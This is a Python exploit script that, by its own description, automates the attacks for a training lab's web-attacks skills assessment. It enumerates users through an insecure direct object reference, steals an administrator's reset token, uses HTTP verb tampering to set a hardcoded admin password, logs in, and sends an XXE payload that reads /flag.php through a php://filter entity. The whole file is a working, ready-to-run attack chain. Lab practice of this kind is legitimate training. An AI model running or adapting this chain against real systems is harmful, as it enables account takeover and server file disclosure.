import sys
import argparse
import requests
from colorama import Style, Fore
import inspect
import base64
import re

def prints(text):
    print(f"{Fore.GREEN}[+] {text}{Style.RESET_ALL}")


def printe(text):
    frame = inspect.currentframe().f_back
    info = inspect.getframeinfo(frame)
    func_name = frame.f_code.co_name
    print(f"{Fore.RED}[-][{func_name}:{info.lineno}] {text}{Style.RESET_ALL}")


def printw(text):
    print(f"{Fore.YELLOW}[!] {text}{Style.RESET_ALL}")


url = ""
cookies = {"PHPSESSID": "", "uid": ""}
admin_cookies = {"PHPSESSID": "", "uid": ""}
headers = {"Content-Type": "application/json"}
password = "VIV4LDI_S33S"


class User:
    def __init__(
        self,
        json_data=None,
    ):
        if json_data:
            self.json_data = json_data
            self.uid = json_data.get("uid")
            self.username = json_data.get("username")
            self.full_name = json_data.get("full_name")
            self.company = json_data.get("company")

    def json(self):  # noqa: F811
        return self.json_data

    def print(self):
        print(f"{Fore.MAGENTA}{'-' * 20}")
        print(self.json())
        print(f"{'-' * 20}{Style.RESET_ALL}")


def get_user(uid: int):
    murl = url + "api.php/user/" + str(uid)
    try:
        response = requests.get(murl, cookies=cookies)
        if len(response.text.strip()) == 0:
            printw(f"No such user with uid {uid}")
            return {}
        return response.json()
    except requests.RequestException as e:
        printe(e)
        return {}


def change_admin_password(admin):
    token = ""
    murl = url + "api.php/token/" + str(admin.uid)
    try:
        response = requests.get(murl, cookies=cookies, headers=headers)
        if len(response.text.strip()) == 0:
            printe("Admin not found")
            return -1
        token = response.json()["token"]
        prints(f"Token successfully extracted: {token}")

        # HTTP Verb Tampering for password change
        murl = url + "reset.php"
        parameters = {"uid": str(admin.uid), "token": token, "password": password}

        response = requests.get(
            murl, cookies=cookies, params=parameters, headers=headers
        )
        if "successful" not in response.text.lower():
            printe(response.text.strip())
            return -1

        prints(
            f"Password successfully changed for Administrator: {admin.username}:{password}"
        )
        return 0
    except requests.RequestException as e:
        printe(e)
        return -1


def get_admin_cookies(admin):
    global admin_cookies
    s = requests.Session()

    murl = url + "index.php"
    data = {"username": admin.username, "password": password}
    try:
        response = s.post(url=murl, data=data, allow_redirects=True)
        if "invalid login!" in response.text.lower():
            printe("Invalid login")
            return -1

        admin_cookies = s.cookies.get_dict()
        prints(
            f"Got admin cookies\nPHPSESSID={admin_cookies['PHPSESSID']}\nuid={admin_cookies['uid']}"
        )
        return 0
    except requests.RequestException as e:
        printe(e)
        return -1


def get_flag():
    payload = """<?xml version="1.0"?>
 <!DOCTYPE name [
  <!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>        
<root>
            <name>
&payload;</name>
            <details>test2</details>
            <date>2025-08-19</date>
            </root>"""
    headers = {
        "Content-Type": "plain/text;charset=UTF-8",
        "Referer": url + "event.php",
        "Origin": url,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
    }
    murl = url + "addEvent.php"

    try:
        response = requests.post(url=murl, data=payload, cookies=admin_cookies)
        if "has been created" not in response.text.lower():
            printe(f"Failed to send XXE payload. Unexpected response: {response.text.strip()}")
            return -1

        match = re.search(r"Event\s+'([^']+)'", response.text)
        if match:
            b64_flag = match.group(1)
            flag = base64.b64decode(b64_flag).decode()
            prints(f"FLAG FOUND: {flag}")
            return 0
        printe("Flag could not be found in response")
        return -1

    except requests.RequestException as e:
        printe(e)
        return -1


def main():
    global url
    global cookies

    parser = argparse.ArgumentParser(
        description="Script for automating the attacks made on Skills Assessment for the Web Attacks Module"
    )
    parser.add_argument(
        "-u",
        "--url",
        required=True,
        help="Target URL with base included for the exploit",
    )
    parser.add_argument(
        "-cu",
        "--current-user-uid",
        required=True,
        help="User with known password",
    )
    parser.add_argument(
        "-c",
        "--session-cookie",
        required=True,
        help="PHPSESSID cookie",
    )

    args = parser.parse_args()
    url = args.url
    if url[-1] != "/":
        url = url + "/"

    cuid = args.current_user_uid
    cookies["PHPSESSID"] = args.session_cookie
    cookies["uid"] = cuid

    json_data = get_user(cuid)
    if len(json_data) == 0:
        return -1
    current_user = User(json_data)
    current_user.print()
    admin = None

    # Find all users in range 100
    for i in range(1, 300):
        if i == cuid:
            continue
        json_data = get_user(i)
        if len(json_data) == 0:
            continue

        user = User(json_data)
        user.print()

        if "admin" in str(user.json().values()).lower():
            prints("Admin found")
            admin = user
            break

    # Change the password of the admin
    if change_admin_password(admin) < 0:
        return -1

    # Get the admin cookies to exploit XXE
    if get_admin_cookies(admin) < 0:
        return -1

    if get_flag() < 0:
        return -1

    return 0


if __name__ == "__main__":
    rc = main()
    if rc < 0:
        sys.exit(1)
    else:
        sys.exit(0)

